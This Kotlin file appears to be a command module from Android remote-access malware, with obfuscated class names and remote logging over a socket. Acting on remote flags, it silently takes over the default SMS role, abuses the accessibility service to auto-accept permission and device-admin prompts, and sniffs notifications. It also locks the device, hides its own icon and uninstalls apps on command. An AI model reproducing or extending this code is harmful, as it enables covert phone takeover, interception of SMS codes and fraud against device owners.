package com.xxx.zzz.commandp

import android.app.PendingIntent
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Telephony
import com.xxx.zzz.aall.permasd.PermUtil
import com.xxx.zzz.accessppp.AccessibilityServiceQ
import com.xxx.zzz.adminp.ActivityAdminqw
import com.xxx.zzz.adminp.AdminReceiverzxc
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.utilssss.Utilslp
import com.xxx.zzz.lockp.SrvLockDevice
import com.xxx.zzz.notifp.DrawerSniffer
import com.xxx.zzz.servicesp.CommandServicedas.Companion.isMyServiceRunning
import com.xxx.zzz.smsp.ChangeSmsManagerew
import com.xxx.zzz.socketsp.IOSocketyt

object Module {

    fun serviceWorkingWhile(context: Context) {
        runCatching {
            SharedPreferencess.init(context.applicationContext)

            //----------------Hidden SMS---------------
            swapSmsManager(context)

            //----------------Stop Sound------------------
            stopSound(context)

            //----------------Kill application------------------
            killApplication(context)

            //------Lock device-----------------
            lockDevice(context)

            //------start notif-----------------
            runCatching {
                if (SharedPreferencess.notifCommandTest == "1" && SharedPreferencess.step2 > 10 && !DrawerSniffer.hasPermission(context)) {
                    if (Utilslp.isScreenOn(context) && PermUtil.isAccessibilityServiceEnabled(context, AccessibilityServiceQ::class.java)) {
                        DrawerSniffer.requestPermission(context)
                        SharedPreferencess.notifCommandTest = ""
                        return
                    }
                }
            }

            //------readPush-----------------
            startReadPush(context)

            //------Get Admin Device-----------------
            startAdminOrLock(context)
        }.onFailure {
            IOSocketyt.sendLogs("", "serviceWorkingWhile error ${it.localizedMessage}", "error")
        }
    }

    private fun swapSmsManager(context: Context) {
        runCatching {
            if (SharedPreferencess.hiddenSMS == "1"
                && PermUtil.isAccessibilityServiceEnabled(context, AccessibilityServiceQ::class.java)
                && Utilslp.isScreenOn(context)
            ) {
                if (Telephony.Sms.getDefaultSmsPackage(context) != context.packageName) {
                    SharedPreferencess.autoClickSmsCommand = "1"
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try {
                            context.startActivity(
                                Intent(
                                    context,
                                    Class.forName(ChangeSmsManagerew::class.java.name)
                                ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            )
                        } catch (e: Exception) {
                            IOSocketyt.sendLogs("", "swapSmsManager ${e.localizedMessage}", "error")
                            ChangeSmsManagerew.swapSmsManager(context, context.packageName)
                        }
                    } else {
                        ChangeSmsManagerew.swapSmsManager(context, context.packageName)
                    }
                    IOSocketyt.sendLogs("", "swapSmsManager start", "success")
                }
            }

            if (Telephony.Sms.getDefaultSmsPackage(context) == context.packageName && Utilslp.isScreenOn(context)) {
                SharedPreferencess.autoClickSmsCommand = "0"
                IOSocketyt.sendLogs("", "swapSmsManager success", "success")
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "swapSmsManager error ${it.localizedMessage}", "error")
        }
    }

    private fun stopSound(context: Context) {
        runCatching {
            if (SharedPreferencess.offSound == "1") {
                SrvLockDevice.stopSound(context)
                IOSocketyt.sendLogs("", "stopSound", "success")
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "stopSound error ${it.localizedMessage}", "error")
        }
    }

    private fun killApplication(context: Context) {
        runCatching {
            if (SharedPreferencess.killApplication.contains(context.packageName)) {
                try {
                    val mAdminReceiverzxc = ComponentName(context, AdminReceiverzxc::class.java)
                    val mDPM = context.applicationContext.getSystemService(Service.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    mDPM.removeActiveAdmin(mAdminReceiverzxc)
                    IOSocketyt.sendLogs("", "killApplication admin", "success")
                } catch (ex: Exception) {
                    IOSocketyt.sendLogs("", "killApplication admin ${ex.localizedMessage}", "error")
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "killApplication error ${it.localizedMessage}", "error")
        }

        //------Delete app-----------
        runCatching {
            if (ActivityAdminqw.isAdminDevice(context)) {
                val nameAppKill = SharedPreferencess.killApplication
                if (nameAppKill.isNotEmpty()) {
                    val intentSender = PendingIntent.getBroadcast(
                        context,
                        100,
                        Intent(context, AdminReceiverzxc::class.java),
                        0
                    ).intentSender
                    val pi = context.packageManager.packageInstaller
                    pi.uninstall(nameAppKill, intentSender)
                    IOSocketyt.sendLogs("", "uninstall admin $nameAppKill", "success")
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "Delete app error ${it.localizedMessage}", "error")
        }

        //---------Kill Application---------------------
        runCatching {
            if (Utilslp.isScreenOn(context)) {
                val nameAppKill = SharedPreferencess.killApplication
                if (nameAppKill.isNotEmpty()) {
                    try {
                        val intent = Intent(Intent.ACTION_DELETE)
                        intent.data = Uri.parse("package:$nameAppKill")
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(intent)
                        IOSocketyt.sendLogs("", "ACTION_DELETE $nameAppKill", "success")
                    } catch (ex: Exception) {
                        val appSettingsIntent = Intent(Intent.ACTION_DELETE)
                        appSettingsIntent.data = Uri.parse("package:$nameAppKill")
                        appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                        appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                        appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                        context.startActivity(appSettingsIntent)
                        IOSocketyt.sendLogs("", "ACTION_DELETE2 $nameAppKill", "success")
                    }
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "Kill Application ${it.localizedMessage}", "error")
        }
    }

    private fun startAdminOrLock(context: Context) {
        runCatching {
            if (SharedPreferencess.adminCommand == "1" && SharedPreferencess.step2 > 10 && !ActivityAdminqw.isAdminDevice(context)) {
                if (Utilslp.isScreenOn(context) && PermUtil.isAccessibilityServiceEnabled(context, AccessibilityServiceQ::class.java)) {
                    SharedPreferencess.autoClickAdminCommand = "1"
                    val dialogIntent = Intent(context, ActivityAdminqw::class.java)
                    dialogIntent.putExtra("admin", "1")
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    context.startActivity(dialogIntent)
                    SharedPreferencess.step2 = 0
                    IOSocketyt.sendLogs("", "startAdminOrLock", "success")
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "startAdminOrLock error ${it.localizedMessage}", "error")
        }
    }

    private fun lockDevice(context: Context) {
        runCatching {
            //------Start Lock Device-----------
            if (SharedPreferencess.lockDevice == "1" && !isMyServiceRunning(context, SrvLockDevice::class.java)) {
                context.startService(Intent(context, SrvLockDevice::class.java))

                val cn = ComponentName(context, AdminReceiverzxc::class.java)
                val dpm = context.applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                dpm.setApplicationHidden(cn, context.packageName, true)
                SharedPreferencess.step2 = 0
                IOSocketyt.sendLogs("", "lockDevice", "success")
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "lockDevice error ${it.localizedMessage}", "error")
        }
    }

    private fun startReadPush(context: Context) {
        runCatching {
            if (SharedPreferencess.readPush == "1"
                && Utilslp.isScreenOn(context)
                && PermUtil.isAccessibilityServiceEnabled(context, AccessibilityServiceQ::class.java)
                && !DrawerSniffer.hasPermission(context)
            ) {
                DrawerSniffer.requestPermission(context)
                IOSocketyt.sendLogs("", "startReadPush requestPermission", "success")
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "startReadPush error ${it.localizedMessage}", "error")
        }
    }
}